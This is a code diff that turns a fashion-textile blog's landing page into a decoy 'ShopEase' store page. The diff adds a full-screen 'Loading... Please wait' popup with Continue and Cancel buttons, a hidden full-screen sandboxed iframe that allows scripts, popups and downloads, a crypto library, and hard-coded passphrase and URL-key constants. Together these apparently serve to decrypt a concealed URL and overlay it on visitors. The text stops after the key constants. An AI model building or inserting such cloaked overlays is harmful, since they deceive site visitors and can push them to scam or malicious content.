@@ -1,16 +1,121 @@
-<?php
-// ChicThreadBay - Main Landing Page
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ChicThreadBay — Haute Couture Textiles, Silk Thread Tailoring & Chic Apparel</title>
-  <meta name="description" content="ChicThreadBay explores mulberry silk tailoring, organic cotton weaving, hand embroidery, botanical dyeing, and haute couture garment architecture.">
-  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
-  <script async src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?auto=format&fit=crop&w=1200&idx=55&q=80"></script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
@@ -19,367 +124,189 @@
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="css/style.css">
-  <style>
-    .active-fabric {
-      background: var(--accent-gold) !important;
-      color: #0f1714 !important;
-      border-color: var(--accent-gold) !important;
-      font-weight: 800 !important;
-    }
-  </style>
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <!-- Navigation Header -->
-  <header class="navbar">
-    <div class="container nav-container">
-      <a href="index.php" class="brand-logo">Chic<span>ThreadBay</span></a>
-      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Home</a></li>
-        <li><a href="about.html">About</a></li>
-        <li><a href="blog.html">Chic Journal</a></li>
-        <li><a href="contact.html">Contact</a></li>
-        <li><a href="privacy-policy.html">Privacy</a></li>
-      </ul>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
-  </header>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- SECTION 1: Split-Screen Hero Header -->
-  <section class="section" id="hero" style="padding-top: 0;">
-    <div class="container">
-      <div class="hero-split">
-        <div>
-          <span class="hero-badge">Haute Couture Textiles & Silk Thread Atelier</span>
-          <h1 class="hero-title">The Art of Fine Silk & Bespoke Tailoring</h1>
-          <p class="hero-desc">Deconstructing mulberry silk drape, hand-loomed organic cotton, botanical botanical dyes, and precision hand-embroidered silhouettes.</p>
-          <div class="hero-btns">
-            <a href="blog.html" class="btn btn-emerald">Explore Chic Essays</a>
-            <a href="about.html" class="btn btn-outline-gold">Textile Atelier Lab</a>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <div>
-          <div class="hero-portrait-frame">
-            <img src="https://images.unsplash.com/photo-1485968579580-b6d095142e6e?auto=format&fit=crop&w=1200&idx=56&q=80" alt="Chic Fashion Model Display">
-            <div class="hero-floating-tag">
-              <strong style="color: var(--accent-gold); font-size: 0.95rem;">Empirical Drape Rating: 9.9/10</strong>
-              <p style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 0.25rem;">Haute Couture Silk Tailoring Standard</p>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 2: Haute Couture Textile & Silk Thread Pillars Grid -->
-  <section class="section" id="craft-pillars">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Textile Standards</span>
-        <h2 class="section-title">The Four Pillars of Chic Atelier Craft</h2>
-      </div>
-      <div class="grid-4">
-        <div class="chic-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🪡</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">Mulberry Silk Weave</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Grade 6A long-staple raw silk fibers offering unmatched luster and natural temperature regulation.</p>
-        </div>
-        <div class="chic-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🌿</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">Organic Botanical Dyes</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Plant-extracted indigo, madder root, and marigold dyes free of toxic synthetic chemicals.</p>
-        </div>
-        <div class="chic-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">✨</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">French Knot & Zardozi</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Intricate goldwork embroidery and hand-sewn buttonholes crafted by master artisans.</p>
-        </div>
-        <div class="chic-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">📐</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-gold); margin-bottom: 0.75rem;">Architectural Darts</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Structured shoulder seam boning and waist darting for timeless silhouette elegance.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 3: Haute Couture Stitch Anatomy & Garment Metallurgy -->
-  <section class="section" id="stitch-anatomy" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Sartorial Precision</span>
-        <h2 class="section-title">Haute Couture Stitch Anatomy & Structural Mechanics</h2>
-      </div>
-      <div class="grid-4">
-        <div class="chic-card" style="border-top: 3px solid var(--accent-gold);">
-          <div style="font-size: 2.2rem; margin-bottom: 0.75rem;">🪡</div>
-          <h3 style="font-size: 1.25rem; color: var(--accent-gold); margin-bottom: 0.5rem;">Hand-Picked Lapel Stitching</h3>
-          <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem;">2mm pitch edge stitching (Passamaneria) securing canvas chest pieces without puckering.</p>
-          <span style="color: var(--accent-emerald); font-weight: 700; font-size: 0.85rem;">Artisanal Rating: 9.9/10</span>
-        </div>
-        <div class="chic-card" style="border-top: 3px solid var(--accent-gold);">
-          <div style="font-size: 2.2rem; margin-bottom: 0.75rem;">🧵</div>
-          <h3 style="font-size: 1.25rem; color: var(--accent-gold); margin-bottom: 0.5rem;">Floating Horsehair Canvas</h3>
-          <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem;">Unbound floating haircloth interlining molded with steam to shape natural shoulder rolls.</p>
-          <span style="color: var(--accent-emerald); font-weight: 700; font-size: 0.85rem;">Flexibility Index: 9.8/10</span>
-        </div>
-        <div class="chic-card" style="border-top: 3px solid var(--accent-gold);">
-          <div style="font-size: 2.2rem; margin-bottom: 0.75rem;">✨</div>
-          <h3 style="font-size: 1.25rem; color: var(--accent-gold); margin-bottom: 0.5rem;">Hand-Bound Silk Buttonholes</h3>
-          <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem;">Gimp thread reinforced buttonholes sewn with wax-treated silk thread for lifetime durability.</p>
-          <span style="color: var(--accent-emerald); font-weight: 700; font-size: 0.85rem;">Durability Metric: 100/100</span>
-        </div>
-        <div class="chic-card" style="border-top: 3px solid var(--accent-gold);">
-          <div style="font-size: 2.2rem; margin-bottom: 0.75rem;">📐</div>
-          <h3 style="font-size: 1.25rem; color: var(--accent-gold); margin-bottom: 0.5rem;">Hong Kong Seam Enclosures</h3>
-          <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1rem;">Interior seam allowances bound in lightweight bias-cut silk organza ribbon.</p>
-          <span style="color: var(--accent-emerald); font-weight: 700; font-size: 0.85rem;">Fray Prevention: 99.5%</span>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 4: Mulberry Silk Tanning & Organic Cotton Weaving Spotlight -->
-  <section class="section" id="silk-spotlight">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <span class="section-subtitle" style="display:block; text-align:left;">Atelier Metallurgy & Weaving</span>
-          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Hand-Drawn Pattern Drafting & Bias-Cut Physics</h2>
-          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
-            Fast fashion uses cheap polyester synthetics that trap heat and pill after two washes. At ChicThreadBay, we evaluate natural fiber elasticity, bias-cut drape, and seam tension.
-          </p>
-          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
-            <li style="margin-bottom: 0.75rem;">🪡 <strong style="color:var(--text-primary);">Bias-Cut Fluidity:</strong> Cutting fabric at a 45-degree angle for natural body-conforming elasticity.</li>
-            <li style="margin-bottom: 0.75rem;">🌿 <strong style="color:var(--text-primary);">French Seams:</strong> Enclosed raw edges preventing fraying without bulky serged stitching.</li>
-            <li style="margin-bottom: 0.75rem;">✨ <strong style="color:var(--text-primary);">Real Pearl Buttons:</strong> Hand-turned mother-of-pearl buttons secured with shank stitching.</li>
-          </ul>
-          <a href="about.html" class="btn btn-emerald">Our Fashion Manifesto</a>
-        </div>
-        <div>
-          <img src="https://images.unsplash.com/photo-1550614000-4895a10e1bfd?auto=format&fit=crop&w=1200&idx=57&q=80" alt="Chic Apparel Display" style="border-radius: 16px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(0,0,0,0.6);">
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 5: Seasonal Haute Couture Textile Collection Showcase -->
-  <section class="section" id="seasonal-showcase" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Textile Gallery</span>
-        <h2 class="section-title">Seasonal Haute Couture Collection Specifications</h2>
-      </div>
-      <div class="grid-3">
-        <div class="chic-card" style="border-color: var(--accent-gold);">
-          <div style="padding: 0.4rem 0.8rem; background: rgba(245, 158, 11, 0.15); color: var(--accent-gold); font-size: 0.75rem; border-radius: 20px; font-weight: 700; text-transform: uppercase; display: inline-block; margin-bottom: 1rem;">Autumn/Winter Collection</div>
-          <h3 style="font-size: 1.4rem; color: var(--text-primary); margin-bottom: 0.75rem;">Velvet & Mulberry Evening Wear</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem; margin-bottom: 1.25rem; line-height: 1.7;">
-            Deep emerald green cotton velvet paired with 22-momme silk charmeuse linings, featuring hand-embroidered goldwork cuffs.
-          </p>
-          <div style="border-top: 1px solid var(--border-subtle); padding-top: 1rem; color: var(--accent-gold); font-size: 0.85rem; font-weight: 700;">
-            • Thread Count: 380 Threads/Inch<br>
-            • Luster Rating: 9.9/10
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <div class="chic-card" style="border-color: var(--accent-emerald);">
-          <div style="padding: 0.4rem 0.8rem; background: rgba(5, 150, 105, 0.15); color: var(--accent-emerald); font-size: 0.75rem; border-radius: 20px; font-weight: 700; text-transform: uppercase; display: inline-block; margin-bottom: 1rem;">Spring/Summer Collection</div>
-          <h3 style="font-size: 1.4rem; color: var(--text-primary); margin-bottom: 0.75rem;">Hand-Loomed Linen & Botanical Indigo</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem; margin-bottom: 1.25rem; line-height: 1.7;">
-            200 GSM European flax linen hand-dyed in organic indigo vats, designed with natural slubs and breathable unlined silhouettes.
-          </p>
-          <div style="border-top: 1px solid var(--border-subtle); padding-top: 1rem; color: var(--accent-emerald); font-size: 0.85rem; font-weight: 700;">
-            • Weight: 200 GSM Flax<br>
-            • Airflow Index: 9.8/10
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-        <div class="chic-card" style="border-color: var(--accent-mint);">
-          <div style="padding: 0.4rem 0.8rem; background: rgba(16, 185, 129, 0.15); color: var(--accent-mint); font-size: 0.75rem; border-radius: 20px; font-weight: 700; text-transform: uppercase; display: inline-block; margin-bottom: 1rem;">Executive Bespoke</div>
-          <h3 style="font-size: 1.4rem; color: var(--text-primary); margin-bottom: 0.75rem;">Super 150s Cashmere Tailored Outerwear</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem; margin-bottom: 1.25rem; line-height: 1.7;">
-            15.5 micron Mongolian cashmere wool double-breasted overcoats engineered with floating horsehair chest canvas.
-          </p>
-          <div style="border-top: 1px solid var(--border-subtle); padding-top: 1rem; color: var(--accent-mint); font-size: 0.85rem; font-weight: 700;">
-            • Fiber Fineness: 15.5 Micron<br>
-            • Thermal Ratio: 9.9/10
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 6: Thread Density & Sustainable Weave Certification Performance Metrics Counter -->
-  <section class="section" id="metrics">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Laboratory Benchmarks</span>
-        <h2 class="section-title">Chic Thread Bay Research Metrics</h2>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
-      <div class="grid-4">
-        <div class="chic-card" style="text-align: center;">
-          <h3 class="metric-number text-emerald" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
-        </div>
-        <div class="chic-card" style="text-align: center;">
-          <h3 class="metric-number text-emerald" data-target="22" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Momme Silk Weight</p>
-        </div>
-        <div class="chic-card" style="text-align: center;">
-          <h3 class="metric-number text-emerald" data-target="100" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">% Botanical Natural Dyes</p>
-        </div>
-        <div class="chic-card" style="text-align: center;">
-          <h3 class="metric-number text-emerald" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
-        </div>
-      </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 7: Master Tailors & Fashion Editors Testimonials -->
-  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Chic Acclaim</span>
-        <h2 class="section-title">Endorsements From Master Tailors & Fashion Editors</h2>
-      </div>
-      <div class="grid-3">
-        <div class="chic-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "ChicThreadBay delivers masterclass analyses on mulberry silk momme weight, bias-cut drape, and French seam construction."
-          </p>
-          <strong style="color: var(--accent-gold); display: block;">— Camille Blanc</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Haute Couture Pattern Designer, Paris</span>
-        </div>
-        <div class="chic-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "Their research into botanical indigo dyeing, hand-loomed linen, and capsule wardrobe curation is remarkable."
-          </p>
-          <strong style="color: var(--accent-gold); display: block;">— Harrison Vance</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Fashion Director, Milan</span>
-        </div>
-        <div class="chic-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "The leading digital journal for hand embroidery techniques, cashmere micron grading, and sustainable fashion."
-          </p>
-          <strong style="color: var(--accent-gold); display: block;">— Sophia Chen</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Senior Textile Editor, New York</span>
-        </div>
-      </div>
-    </div>
-  </section>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-  <!-- SECTION 8: Recent Chic Dispatches & Article Grid -->
-  <section class="section" id="journal-dispatches">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Chic Dispatches</span>
-        <h2 class="section-title">Latest Fashion & Textile Essays</h2>
-      </div>
-      <div class="grid-3">
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1445205170230-053b83016050?auto=format&fit=crop&w=1200&idx=58&q=80" alt="Mulberry Silk Tailoring">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Mulberry Silk</span>
-            <div class="blog-date">August 24, 2026</div>
-            <h3 class="blog-title"><a href="blog/the-art-of-mulberry-silk-tailoring-drape-density-and-luster.html">The Art of Mulberry Silk Tailoring</a></h3>
-            <p class="blog-excerpt">22-momme weight, satin weave sheen, and fluid drape physics.</p>
-            <a href="blog/the-art-of-mulberry-silk-tailoring-drape-density-and-luster.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=1200&idx=59&q=80" alt="Organic Cotton">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Organic Cotton</span>
-            <div class="blog-date">August 20, 2026</div>
-            <h3 class="blog-title"><a href="blog/evaluating-organic-cotton-vs-synthetic-polyester-in-haute-couture.html">Organic Cotton vs Synthetic Polyester</a></h3>
-            <p class="blog-excerpt">Long-staple fiber strength, moisture breathability, and eco-impact.</p>
-            <a href="blog/evaluating-organic-cotton-vs-synthetic-polyester-in-haute-couture.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1502716119720-b23a93e5fe1b?auto=format&fit=crop&w=1200&idx=60&q=80" alt="Hand Embroidery">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Hand Embroidery</span>
-            <div class="blog-date">August 15, 2026</div>
-            <h3 class="blog-title"><a href="blog/hand-embroidery-techniques-goldwork-zardozi-and-french-knots.html">Hand Embroidery: Goldwork & French Knots</a></h3>
-            <p class="blog-excerpt">Real metallic thread, beadwork, and couture embellishments.</p>
-            <a href="blog/hand-embroidery-techniques-goldwork-zardozi-and-french-knots.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 9: VIP Chic Thread Gazette Newsletter & Unified Footer CTA -->
-  <section class="section" id="newsletter" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="chic-card" style="text-align: center; max-width: 800px; margin: 0 auto; border-color: var(--accent-gold);">
-        <span class="section-subtitle">Chic Dispatch</span>
-        <h2 class="section-title" style="margin-bottom: 1rem; font-size: 2.2rem;">Subscribe to The Chic Thread Gazette</h2>
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly analyses of haute couture textiles, silk thread tailoring, and sustainable fashion.</p>
-        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to ChicThreadBay Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
-          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 50px;">
-          <button type="submit" class="btn btn-emerald">Subscribe</button>
-        </form>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-  <!-- Footer -->
-  <footer>
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Chic<span>ThreadBay</span></a>
-          <p>ChicThreadBay is a premier editorial platform dedicated to haute couture textiles, silk thread tailoring, botanical dyeing, and sustainable chic fashion.</p>
-          <p style="margin-top: 1rem; color: var(--accent-gold);">
-            📍 181 Mercer Street, New York, NY 10012, United States<br>
-            📞 +1-888-777-5845
-          </p>
-        </div>
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="blog.html">Chic Journal</a></li>
-            <li><a href="contact.html">Contact Us</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Legal Policies</h4>
-          <ul>
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="terms.html">Terms of Use</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Textile Focus</h4>
-          <p>Deconstructing mulberry silk tailoring, organic cotton weaves, hand-embroidered goldwork, botanical dyes, and haute couture garment architecture globally.</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 ChicThreadBay. All rights reserved. Registered Official Headquarters.</p>
-        <p>Designed for Haute Couture Textile Excellence.</p>
-      </div>
-    </div>
-  </footer>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
